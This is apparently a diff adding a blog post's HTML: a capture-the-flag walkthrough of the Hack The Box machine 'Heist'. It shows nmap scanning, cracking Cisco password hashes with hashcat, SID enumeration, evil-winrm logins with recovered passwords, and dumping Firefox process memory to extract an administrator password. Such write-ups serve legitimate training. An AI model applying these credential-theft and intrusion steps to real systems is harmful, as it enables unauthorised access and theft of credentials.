@@ -1,0 +1,511 @@
+<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Heist" /><meta property="og:locale" content="en_US" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="http://susanou.github.io/Writeups/posts/Heist/" /><meta property="og:url" content="http://susanou.github.io/Writeups/posts/Heist/" /><meta property="og:site_name" content="Writeups" /><meta property="og:image" content="http://susanou.github.io/Writeups/assets/img/HackTheBox/Heist/Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-12T23:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://susanou.github.io/Writeups/assets/img/HackTheBox/Heist/Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/infocard.png" /><meta property="twitter:title" content="Heist" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-07-06T17:34:52+02:00","datePublished":"2020-11-12T23:00:00+01:00","description":"Enumeration","headline":"Heist","image":"http://susanou.github.io/Writeups/assets/img/HackTheBox/Heist/Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://susanou.github.io/Writeups/posts/Heist/"},"url":"http://susanou.github.io/Writeups/posts/Heist/"}</script><title>Heist | Writeups</title><link rel="apple-touch-icon" sizes="180x180" href="/Writeups/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/Writeups/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/Writeups/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/Writeups/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/Writeups/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Writeups"><meta name="application-name" content="Writeups"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/Writeups/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/Writeups/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/Writeups/assets/js/dist/post.min.js"></script> <script defer src="/Writeups/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/Writeups/" alt="avatar" class="mx-auto"> <img src="/Writeups/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/Writeups/">Writeups</a></div><div class="site-subtitle font-italic">Student by day Hacker by night</div></div><ul class="w-100"><li class="nav-item"> <a href="/Writeups/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/Writeups/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/Writeups/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/Writeups/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/Writeups/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Susanou" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/337512" aria-label="htb" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cam.hochberg','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/Writeups/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/cam-hochberg/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/Writeups/"> Posts </a> </span> <span>Heist</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Heist</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Cameron Hochberg </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Nov 12, 2020, 11:00 PM +0100" prep="on" > Nov 12, 2020 <i class="unloaded">2020-11-12T23:00:00+01:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 6, 2021, 11:34 AM -0400" prefix="Updated " > Jul 6, 2021 <i class="unloaded">2021-07-06T17:34:52+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1457 words">8 min</span></div></div><div class="post-content"><h1 id="enumeration">Enumeration</h1><p>Let’s start with some basic enumeration of the machine and adding it to our <code class="language-plaintext highlighter-rouge">/etc/host</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Heist/Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/hosts.png" alt="Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/hosts.png" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre>sudo nmap -sS -sC -sV -p- 10.10.10.149
+[sudo] Mot de passe de fukurou :
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-10 19:03 CET
+Nmap scan report for 10.10.10.149
+Host is up (0.088s latency).
+Not shown: 65530 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1m07s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-11-10T18:07:44
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 365.12 seconds
+</pre></table></code></div></div><p>We have few different ports open but let’s just check port <code class="language-plaintext highlighter-rouge">80</code></p><h1 id="recon">Recon</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Heist/Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/Screenshot_20201114_185304.png" alt="Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/Screenshot_20201114_185304.png" /></p><p>We get a normal loading screen. I tried to login with regular combinations:</p><ul><li><code class="language-plaintext highlighter-rouge">admin:admin</code><li><code class="language-plaintext highlighter-rouge">admin:password</code></ul><p>I also tried normal SQLi <code class="language-plaintext highlighter-rouge">' or 1=1</code> still nothing. It does however give us access as guest</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Heist/Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/chat.png" alt="Heist%2038ff3fd3bfd24107a8f14a7a32b8b6eb/chat.png" /></p><p>Now we have access to a chat window and we find an attachement:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>version 12.2
+no service pad
+service password-encryption
+!
+isdn switch-type basic-5ess
+!
+hostname ios-1
+!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+!
+!
+ip ssh authentication-retries 5
+ip ssh version 2
+!
+!
+router bgp 100
+ synchronization
+ bgp log-neighbor-changes
+ bgp dampening
+ network 192.168.0.0Â mask 300.255.255.0
+ timers bgp 3 9
+ redistribute connected
+!
+ip classless
+ip route 0.0.0.0 0.0.0.0 192.168.0.1
+!
+!
+access-list 101 permit ip any any
+dialer-list 1 protocol ip list 101
+!
+no ip http server
+no ip http secure-server
+!
+line vty 0 4
+ session-timeout 600
+ authorization exec SSH
+ transport input ssh
+</pre></table></code></div></div><p>The first hash was identified as:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>hashid
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91
+Analyzing '$1$pdQG$o8nrSzsGXeaduXrjlvKc91'
+[+] MD5 Crypt
+[+] Cisco-IOS(MD5)
+[+] FreeBSD MD5
+</pre></table></code></div></div><p>I used hashcat to crack it:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+</pre><td class="rouge-code"><pre>hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-7820HK CPU @ 2.90GHz, 13853/13917 MB (4096 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 66 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+Time.Started.....: Tue Nov 10 19:39:43 2020 (1 min, 57 secs)
+Time.Estimated...: Tue Nov 10 19:41:40 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    28346 H/s (6.28ms) @ Accel:96 Loops:250 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 3543552/14344385 (24.70%)
+Rejected.........: 0/3543552 (0.00%)
+Restore.Point....: 3542784/14344385 (24.70%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
+Candidates.#1....: stedigner4 -&gt; steakdi
+
+Started: Tue Nov 10 19:39:20 2020
+Stopped: Tue Nov 10 19:41:42 2020
+</pre></table></code></div></div><p>The last two needed some googling to crack<code class="language-plaintext highlighter-rouge">cisco password 7</code></p><p>Using the first website you get from the search you can creack both remaing hashes:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>0242114B0E143F015F5D1E161713:$uperP@ssword
+02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
+</pre></table></code></div></div><p>Now we have a list of potential users an potential passwords.:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>hazard
+tout3r
+admin
+
+stealth1agent
+$uperP@ssword
+Q4)sJu\Y8qz*A3?d
+</pre></table></code></div></div><h1 id="foothold-and-user-access">Foothold and user access</h1><p>Now i managed to get other users using <code class="language-plaintext highlighter-rouge">lookupsid.py</code> and the user and password combination <code class="language-plaintext highlighter-rouge">hazard:stealth1agent</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>lookupsid.py hazard:stealth1agent@heist.htb
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Brute forcing SIDs at heist.htb
+[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+</pre></table></code></div></div><p>Now we get new potential users and trying to connect using <code class="language-plaintext highlighter-rouge">evil-winrm</code> I managed to get access using <code class="language-plaintext highlighter-rouge">chase:Q4)sJu\Y8qz*A3?d</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>evil-winrm -i heist.htb -u chase -p 'Q4)sJu\Y8qz*A3?d'
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt; whoami
+supportdesk\chase
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt; ls
+
+    Directory: C:\Users\Chase\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/14/2020   5:31 AM        1309448 aa.exe
+
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; ls
+
+    Directory: C:\Users\Chase\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/22/2019   9:08 AM            121 todo.txt
+-a----        4/22/2019   9:07 AM             32 user.txt
+</pre></table></code></div></div><p>Get the user flag</p><h1 id="priviledge-escalation">Priviledge Escalation</h1><p>In ps you find 4 <code class="language-plaintext highlighter-rouge">firefox</code> processes running currently. Firefox haz been known to store passwords in plain</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; ps
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    454      18     2252       5460               408   0 csrss
+    293      17     2256       5200               496   1 csrss
+    358      15     3516      14720              5356   1 ctfmon
+    164       9     1896       9808       0.14   2816   1 dllhost
+    257      14     4192      13600              4024   0 dllhost
+    623      32    32952      59204              1020   1 dwm
+   1496      58    23532      78392              5588   1 explorer
+    408      32    16920      62672       1.61   5276   1 firefox
+    358      26    16276      37564       0.47   6508   1 firefox
+    390      39   106600     138304      44.73   6644   1 firefox
+   1134      74   168208     210304      21.28   6812   1 firefox
+    345      20    10620      38872       0.13   6936   1 firefox
+-------------
+CUT CONTENT
+-------------
+</pre></table></code></div></div><p>so we go for <code class="language-plaintext highlighter-rouge">procdump.exe</code> and use <code class="language-plaintext highlighter-rouge">strings.exe</code> to be able to read the contents of the file and use <code class="language-plaintext highlighter-rouge">grep</code> or <code class="language-plaintext highlighter-rouge">findstr</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\Chase\Documents&gt; ./procdump64.exe -ma 6644 -accepteula
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[23:47:37] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_201114_234737.dmp
+[23:47:37] Dump 1 writing: Estimated dump file size is 374 MB.
+[23:47:37] Dump 1 complete: 374 MB written in 0.5 seconds
+[23:47:37] Dump count reached.
+
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt; upload strings64.exe
+Info: Uploading strings64.exe to C:\Users\Chase\Documents\strings64.exe
+
+Data: 598516 bytes of 598516 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt; cmd /c "strings64.exe -accepteula firefox.exe_201114_234737.dmp &gt; firefox.exe_201114_234737.dmp.txt"
+cmd.exe :
+    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+Strings v2.53 - Search for ANSI and Unicode strings in binary images.
+Copyright (C) 1999-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt;
+</pre></table></code></div></div><p>Get the password from either <code class="language-plaintext highlighter-rouge">findstr</code> or download the file from the step above and use <code class="language-plaintext highlighter-rouge">grep</code> to find a string ressembling <code class="language-plaintext highlighter-rouge">password, </code>passowrd=`` etc.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$cat firefox.exe_201114_234737.dmp.txt | grep "password="
+RG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+</pre></table></code></div></div><p>Use the password we get with <code class="language-plaintext highlighter-rouge">evil-winrm</code></p><p><code class="language-plaintext highlighter-rouge">evil-winrm -i heist.htb -u administrator -p '4dD!5}x/re8]FBuZ'</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>$evil-winrm -i heist.htb -u administrator -p '4dD!5}x/re8]FBuZ'
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+supportdesk\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/22/2019   9:05 AM             32 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;
+</pre></table></code></div></div><p>GET A ROOT FLAG</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/Writeups/categories/hack-the-box/'>Hack The Box</a>, <a href='/Writeups/categories/retired/'>Retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/Writeups/tags/hashcat/" class="post-tag no-text-decoration" >Hashcat</a> <a href="/Writeups/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/Writeups/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/Writeups/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/Writeups/tags/evil-winrm/" class="post-tag no-text-decoration" >evil-winrm</a> <a href="/Writeups/tags/easy/" class="post-tag no-text-decoration" >easy</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Heist - Writeups&url=http://susanou.github.io/Writeups/posts/Heist/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Heist - Writeups&u=http://susanou.github.io/Writeups/posts/Heist/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Heist - Writeups&url=http://susanou.github.io/Writeups/posts/Heist/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Writeups/posts/cycling/">Cycling</a><li><a href="/Writeups/posts/mlsteal/">MLSteal</a><li><a href="/Writeups/posts/pythia/">Pythia</a><li><a href="/Writeups/posts/ChunkNoris/">Chunk Norris</a><li><a href="/Writeups/posts/Admirer/">Admirer</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/Writeups/tags/crypto/">crypto</a> <a class="post-tag" href="/Writeups/tags/rsa/">RSA</a> <a class="post-tag" href="/Writeups/tags/easy/">easy</a> <a class="post-tag" href="/Writeups/tags/web/">web</a> <a class="post-tag" href="/Writeups/tags/aes/">AES</a> <a class="post-tag" href="/Writeups/tags/linux/">linux</a> <a class="post-tag" href="/Writeups/tags/misc/">misc</a> <a class="post-tag" href="/Writeups/tags/mitm/">MITM</a> <a class="post-tag" href="/Writeups/tags/sqli/">SQLi</a> <a class="post-tag" href="/Writeups/tags/crt/">CRT</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Writeups/posts/Admirer/"><div class="card-body"> <span class="timeago small" > Aug 1, 2020 <i class="unloaded">2020-08-01T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Admirer</h3><div class="text-muted small"><p> Reconnaissance &amp; Enumeration Let’s first start by looking at what ports are open on the machine: $ nmap -sS -sC -sV -p- 10.10.10.187 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 19:2...</p></div></div></a></div><div class="card"> <a href="/Writeups/posts/qudraticresidue/"><div class="card-body"> <span class="timeago small" > Jan 11, 2021 <i class="unloaded">2021-01-11T23:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Quadratic Residues</h3><div class="text-muted small"><p></p></div></div></a></div><div class="card"> <a href="/Writeups/posts/scriptkiddie/"><div class="card-body"> <span class="timeago small" > Jan 11, 2021 <i class="unloaded">2021-01-11T23:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Script Kiddie</h3><div class="text-muted small"><p></p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Writeups/posts/Bucket/" class="btn btn-outline-primary" prompt="Older"><p>Bucket</p></a> <a href="/Writeups/posts/phonebook/" class="btn btn-outline-primary" prompt="Newer"><p>Phonebook</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/Writeups/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//writeups-fukurou.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Heist'; this.page.url = 'http://susanou.github.io/Writeups/posts/Heist/'; this.page.identifier = '/posts/Heist/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 